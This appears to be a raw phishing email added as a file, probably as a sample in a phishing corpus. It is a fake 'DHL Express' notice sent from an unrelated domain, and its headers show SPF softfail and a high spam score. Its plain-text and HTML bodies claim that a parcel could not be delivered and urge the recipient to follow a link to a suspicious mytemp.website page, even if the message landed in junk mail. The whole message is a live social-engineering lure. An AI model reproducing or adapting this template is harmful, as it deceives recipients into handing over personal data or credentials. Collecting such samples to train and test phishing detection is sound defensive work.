@@ -1,0 +1,202 @@
+Return-Path: info@judiciary.com.co
+Delivered-To: jose@monkey.org
+X-FDA: 83123288388.27.8CD6D83
+Received: from vps.infotools.in (vps.infotools.in [103.250.184.41])
+	by imf14.b.hostedemail.com (Postfix) with ESMTP id 0FFD960008
+	for <jose@monkey.org>; Sat, 15 Feb 2025 20:17:11 +0000 (UTC)
+Authentication-Results: imf14.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=softfail (imf14.b.hostedemail.com: 103.250.184.41 is neither permitted nor denied by domain of info@judiciary.com.co) smtp.mailfrom=info@judiciary.com.co
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1739650632;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references; bh=iGtHlAPlFUAurzoJkzWeNyF5KDGP37PiCeCwqg+p+rg=;
+	b=wM7nLqugJ3ROwkuAKeylUDTpICBUYCoGo/eEwMTO0/NHtl2v2I/z4ebfbGerCkA4shh26H
+	hlXrRakj5lW4nBOtgpltLvgr/JrYZphLPRxw+OCpgH7nROqGD+L88iLKXf2HW/PLJDn4dz
+	c/DrHsthFMwt9ma/Fw5bT2T98rAMjzA=
+ARC-Authentication-Results: i=1;
+	imf14.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=softfail (imf14.b.hostedemail.com: 103.250.184.41 is neither permitted nor denied by domain of info@judiciary.com.co) smtp.mailfrom=info@judiciary.com.co
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1739650632; a=rsa-sha256;
+	cv=none;
+	b=vUZUnwyCplvMIFW+5cwccpLMu+aLTV0wiv8JRgSojvn1akqnZf3fuL+HUzuVP0au2NOcZQ
+	iOuU5fkGYOULDpwNSgi//6yX9UrlM0kgHgD9T7F8sbtwoTyUszX3/Lx7ftKc53VgxID42e
+	4q55RMrMbwTM8F70Pu009eYF+2Vvl1Y=
+Received: from ip226.ip-51-38-88.eu ([51.38.88.226] helo=WIN-KN4NG254DSS)
+	by vps.infotools.in with esmtp (Exim 4.96)
+	(envelope-from <info@judiciary.com.co>)
+	id 1tj2B5-0002M3-22
+	for jose@monkey.org;
+	Sat, 15 Feb 2025 01:50:48 +0530
+From: "DHL Express" <info@judiciary.com.co>
+Subject: Your Parcel Has Arrived!
+To: <jose@monkey.org>
+Content-Type: multipart/alternative; boundary="bzbfbmO=_0iotPFaVBLi70GwiLBGmUxvXg"
+MIME-Version: 1.0
+Date: Fri, 14 Feb 2025 12:20:47 -0800
+Message-Id: <202514021220463790D1BA04-582DE8954E@judiciary.com.co>
+X-Rspamd-Queue-Id: 0FFD960008
+X-Spam-Status: Yes, score=10.44
+X-Stat-Signature: ahguf5biini886d7rcxhrtox7m7tfj4x
+X-Rspam-User: 
+X-Rspamd-Server: rspam07
+X-HE-Tag: 1739650631-873432
+X-HE-Meta: U2FsdGVkX1+gKTaMNRrPvrUUXZbQeQUKfwsYn46+WUplsg0W2SWler7kn1/bxznfew0t8nQvkFzVVLWVs0hoIQurWeh0BH6AjPtlskjUy037bChZ7W6V0UwaILoOlHo0B9lZBVcalNnhk6ASNstZAJYnNrVBPNXvJR+laUPd5DOWZOD5uNZDakOg9dEuxdB0QADARN4DLSePpPBTEZKA9tBj1S+K+17C9bxk9LpvEhhPGIXzD9a68gSkhSD3aSxXFTnEYsW7uZ46k23I9XOa32LE3bDBY4bKfY9iGKcaBfB5PdqDuXy9AhXn/faeCNsm9Q3MFuY+Acw73/3TkobU3O5PN9uvyY+/R34/3ztmYPrE/mxUyTZFRbbZEpmqm3cb4iaengiSNkGumpNQWTLT0xDmn3tWfA4iJ8bsV2xzW8ZGgMX6LaMx47HZ12WyhxXCHCmuWQc+3EevL30Z71e7Y80yQwXWcHTR6cyir0d+3RCxXuvAiTbKUtBtWTBwVaPG+I54NdZssf4yTuxv8M7bsBSNR/rgzpUnGt06BAwg0hsMLXlV/y0bR9kizluDyo94dgDrxzAIhWVjGhLIzNltEVBjwDhpbbJWWf4bmEZANAh+BENoAlWMJuS4QUTv6yZfYJXa03H7WJFTRPzvJJZZfnZWcgXVG+B70aAF1eLNFxgoZ37o57ywWchfFEWteNOYoFq+zODbejN6VUrMWUeYFgTpSh07f93mQxrCShtxDSBN3CKRBTtspxRcJy+89OSFtTbtWktumcxI2AfMdRSR9HnUU9rQqaRPpWPFP+yfV1vTdW03UV1QIafL1Pr7AKdmbRL3fVfxhM+MxKNYuckSKneDLNuyqvjmeMAFtC27q15x3+PGHR8h6YzbEWM6x7EENBxsYhbrp3GLiKpn0woqVXEDIsa5YYXs9/A9xehvE+coRpE6iaCFQKkbCCxZ6jyPuSYkDKB9xMFUr0sICaASCJbgeav
+ gZ4eH8CT/mzIt+VV7FA6YXPSiJIOzVgjc6G4DhuXzi2+CqS+DFuU2ppDFoHfdNGQVMafxQHD4aXxEDVTsUSvH2TnkaCsPwudyMk1oyap6oy5vBNLsXeMYcfRlcim4UdfBkn7rpBI7SdW18WvYBPEWJnWBnexaNws2+5nd5201HAMwBTD7P1yMzW71/TQhG6Vy0ZW4GFvblqZkBiUNVRF/eZJgSQzFFhTf3/6tF6FIhDm396o=
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 41
+
+This is a multi-part message in MIME format
+
+--bzbfbmO=_0iotPFaVBLi70GwiLBGmUxvXg
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+Dear Sir/Ma,
+
+Please receive your packages:
+Your parcel arrived at the post office=20
+
+Our courier was unable to deliver the parcel to you=20
+
+Due to incomplete delivery details
+
+To receive your parcel
+Click the following URL in your browser:
+
+Please follow the link https://5p3.6bc.mytemp.website/mail/index.html
+
+--Shipment Details--
+
+|Insurance: Yes |Authorization: RMA |Status: e- Notification
+
+--------------------------------
+
+This email is scanned(secured) and sent to you because you are a subsc=
+riber to our newsletter.
+
+NOTE: IF MESSAGE IS FOUND BY ERROR IN YOUR JUNK MAIL KINDLY OPEN AS SA=
+ME.=20
+
+=A9 2025 DHL Express | Customer Service |
+
+--bzbfbmO=_0iotPFaVBLi70GwiLBGmUxvXg
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-=
+8859-1">
+  <META name=3D"viewport" content=3D"width=3Ddevice-width, initial-sca=
+le=3D1"> <META name=3D"format-detection" content=3D"telephone=3Dno"> <=
+title>Your Parcel Has Arrived!</title>
+ </head>
+ <body style=3D"BACKGROUND-COLOR: #ffffff" bgColor=3D#ffffff> <DIV sty=
+le=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WHI=
+TE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT=
+: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2=
+; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-l=
+igatures: normal; font-variant-caps: normal; -webkit-text-stroke-width=
+: 0px; text-decoration-thickness: initial; text-decoration-style: init=
+ial; text-decoration-color: initial"><SPAN style=3D"FONT-FAMILY: 'time=
+s new roman', serif"><BR><IMG style=3D"BORDER-LEFT-WIDTH: medium; BORD=
+ER-RIGHT-WIDTH: medium; WIDTH: 697px; BORDER-BOTTOM-WIDTH: medium; MIN=
+-HEIGHT: 52px; BORDER-TOP-WIDTH: medium" src=3D"https://ci3.googleuser=
+content.com/meips/ADKq_NZq8LOtSSKpAk9ymsCnnu1qhGoUPy4JKQ5aPjMYnLxj9oAK=
+hysMFeqILncAhNVaIWk58qAuUeMOtANTfC-Mg9fjkckzOf2HOT4hJ4t3hr2xhiA=3Ds0-d=
+-e1-ft#http://i.emlfiles1.com/cmpimg/2009/9453/562763_dhlheader.jpg" w=
+idth=3D844 height=3D53></SPAN><PRE style=3D"WHITE-SPACE: pre-wrap"><SP=
+AN style=3D"FONT-FAMILY: 'times new roman', serif">Dear Sir/Ma,</SPAN>=
+</PRE><PRE style=3D"WHITE-SPACE: pre-wrap"><SPAN style=3D"FONT-FAMILY:=
+ 'times new roman', serif">Please receive your packages:<BR clear=3Dno=
+ne>Your parcel arrived at the post office </SPAN></PRE><PRE style=3D"W=
+HITE-SPACE: pre-wrap"><SPAN style=3D"FONT-FAMILY: 'times new roman', s=
+erif">Our courier was unable to deliver the parcel to you </SPAN></PRE=
+><PRE style=3D"WHITE-SPACE: pre-wrap"><SPAN style=3D"FONT-FAMILY: 'tim=
+es new roman', serif">Due to incomplete delivery details</SPAN></PRE><=
+PRE style=3D"WHITE-SPACE: pre-wrap"><SPAN style=3D"FONT-FAMILY: 'times=
+ new roman', serif">To receive your parcel<BR clear=3Dnone>Click the f=
+ollowing URL in your browser:</SPAN></PRE><PRE style=3D"WHITE-SPACE: p=
+re-wrap"><BR><SPAN style=3D"FONT-FAMILY: 'times new roman', serif"><A =
+style=3D"COLOR: rgb(17,85,204)" href=3D"https://5p3.6bc.mytemp.website=
+/mail/index.html" target=3D_blank data-saferedirecturl=3D"https://www.=
+google.com/url?q=3Dhttps://5p3.6bc.mytemp.website/mail/index.html&amp;=
+source=3Dgmail&amp;ust=3D1739629427486000&amp;usg=3DAOvVaw3rZzgjtOiZYS=
+-DiIWy6R2M">Please follow the link</A><SPAN style=3D"FONT-SIZE: 10pt">=
+<BR></SPAN><BR> <SPAN style=3D"COLOR: rgb(51,51,51)"> --<SPAN style=3D=
+"COLOR: rgb(68,0,98)"><B>Shipment Details</B></SPAN>--</SPAN></SPAN></=
+PRE><PRE style=3D"WHITE-SPACE: pre-wrap"><SPAN style=3D"FONT-FAMILY: '=
+times new roman', serif"><SPAN style=3D"COLOR: rgb(51,51,51)">|</SPAN>=
+Insurance: Yes</SPAN><SPAN style=3D"FONT-FAMILY: 'times new roman', se=
+rif"> |Authorization: RMA &nbsp; |Status: e- Notification</SPAN></PRE>=
+<PRE style=3D"WHITE-SPACE: pre-wrap"><SPAN style=3D"FONT-FAMILY: 'time=
+s new roman', serif">------------------------------<WBR>--</SPAN></PRE=
+><SPAN style=3D"FONT-FAMILY: 'times new roman', serif"><SPAN style=3D"=
+COLOR: rgb(64,0,0)"><SPAN style=3D"COLOR: rgb(0,0,0)"><SPAN style=3D"C=
+OLOR: rgb(255,0,0)"><A style=3D"BORDER-LEFT-WIDTH: 1pt; BORDER-RIGHT-W=
+IDTH: 1pt; BACKGROUND-IMAGE: none; BACKGROUND-REPEAT: repeat; BORDER-B=
+OTTOM: 1pt dashed; COLOR: rgb(204,0,0); BORDER-TOP-WIDTH: 1pt" shape=3D=
+rect name=3Dm_-5738228760095529112_m_8219493630814406129_m_62326153247=
+42114907_m_- rel=3Dnofollow></A><IMG style=3D"BORDER-LEFT-WIDTH: mediu=
+m; BORDER-RIGHT-WIDTH: medium; WIDTH: 110px; MIN-HEIGHT: 96px; BORDER-=
+TOP-WIDTH: medium; MARGIN-RIGHT: 0px" border=3D0 hspace=3D0 src=3D"htt=
+ps://ci3.googleusercontent.com/meips/ADKq_NYWSfQzP-5KDkUrahAI01h2mlTzb=
+MB1kOqFa1VkKrOfF427wK-Cm050Xa51i1Ds1mQlSoCWPwmjaMlzVaA3pyOIWRSfC8lcGzL=
+i9_frmqG8V4kNXqvsHTQbcGjjnjqHRPgPDyJIeYq3y0FLafgVfJV58kDBXw60R07T3bY=3D=
+s0-d-e1-ft#https://i.emlfiles.com/cmpimg/2/2/9/5/2/files/imagecache/83=
+5056/w170_1464366_latinamericanmaledown.jpg" width=3D134 height=3D297>=
+</SPAN></SPAN></SPAN><IMG style=3D"BORDER-RIGHT-WIDTH: medium; WIDTH: =
+187px; MIN-HEIGHT: 235px; BORDER-TOP-WIDTH: medium" border=3D0 hspace=3D=
+0 width=3D255 align=3Dbottom height=3D330></SPAN> <DIV><SPAN style=3D"=
+FONT-FAMILY: 'times new roman', serif"><BR clear=3Dnone><BR clear=3Dno=
+ne></SPAN></DIV> <DIV> <DIV><SPAN style=3D"FONT-FAMILY: 'times new rom=
+an', serif"><BR clear=3Dnone><BR clear=3Dnone></SPAN></DIV> <DIV> <DIV=
+><SPAN style=3D"FONT-FAMILY: 'times new roman', serif"><BR clear=3Dnon=
+e><BR clear=3Dnone></SPAN></DIV> <DIV> <DIV><SPAN style=3D"FONT-FAMILY=
+: 'times new roman', serif"><BR clear=3Dnone><BR clear=3Dnone></SPAN><=
+/DIV> <DIV> <DIV><SPAN style=3D"FONT-FAMILY: 'times new roman', serif"=
+><BR clear=3Dnone><BR clear=3Dnone></SPAN></DIV> <DIV dir=3Dltr><SPAN =
+style=3D"FONT-FAMILY: 'times new roman', serif">&nbsp; &nbsp; &nbsp; &=
+nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &=
+nbsp;&nbsp;<BR clear=3Dnone></SPAN> <DIV> <DIV> <DIV><SPAN style=3D"FO=
+NT-FAMILY: 'times new roman', serif"><BR clear=3Dnone></SPAN> <DIV sty=
+le=3D"FONT-SIZE: 11px; PADDING-BOTTOM: 0.8em; PADDING-TOP: 0.8em; PADD=
+ING-LEFT: 1.5em; LINE-HEIGHT: 15px; PADDING-RIGHT: 1.5em; BACKGROUND-C=
+OLOR: rgb(253,246,202)"><SPAN style=3D"FONT-FAMILY: 'times new roman',=
+ serif">This email is scanned(secured) and sent to you&nbsp;<SPAN styl=
+e=3D"FONT-SIZE: small; COLOR: rgb(102,102,102)">because you are a&nbsp=
+;</SPAN><SPAN style=3D"FONT-SIZE: small; COLOR: rgb(102,102,102)">subs=
+criber to our newsletter.</SPAN></SPAN></DIV> <DIV style=3D"FONT-SIZE:=
+ 11px; PADDING-BOTTOM: 0.8em; PADDING-TOP: 0.8em; PADDING-LEFT: 1.5em;=
+ LINE-HEIGHT: 15px; PADDING-RIGHT: 1.5em; BACKGROUND-COLOR: rgb(253,24=
+6,202)" dir=3Dltr><SPAN style=3D"FONT-FAMILY: 'times new roman', serif=
+"><SPAN style=3D"FONT-SIZE: small; COLOR: rgb(102,102,102)"><SPAN styl=
+e=3D"FONT-SIZE: xx-small"><B>NOTE</B>:&nbsp;IF MESSAGE IS FOUND BY ERR=
+OR IN YOUR JUNK MAIL KINDLY OPEN AS SAME</SPAN></SPAN>.</SPAN> <DIV>&n=
+bsp;</DIV> <DIV><SPAN style=3D"FONT-FAMILY: 'times new roman', serif">=
+<SPAN style=3D"FONT-SIZE: 8pt; COLOR: rgb(102,102,102)">&nbsp; &nbsp; =
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; =
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; =
+&nbsp; &nbsp; &nbsp;&copy; 2025&nbsp;DHL&nbsp;Express | Customer Servi=
+ce |&nbsp;</SPAN></SPAN></DIV> <DIV>&nbsp;</DIV></DIV></DIV></DIV></DI=
+V></DIV></DIV></DIV></DIV></DIV></DIV> <P style=3D"FONT-SIZE: small; F=
+ONT-FAMILY: Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SP=
+ACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,3=
+4); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; BACKGROUND-COLOR: rgb(2=
+55,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-va=
+riant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-th=
+ickness: initial; text-decoration-style: initial; text-decoration-colo=
+r: initial"><BR>&nbsp;</P></body>
+ </html>
+
+--bzbfbmO=_0iotPFaVBLi70GwiLBGmUxvXg--
+
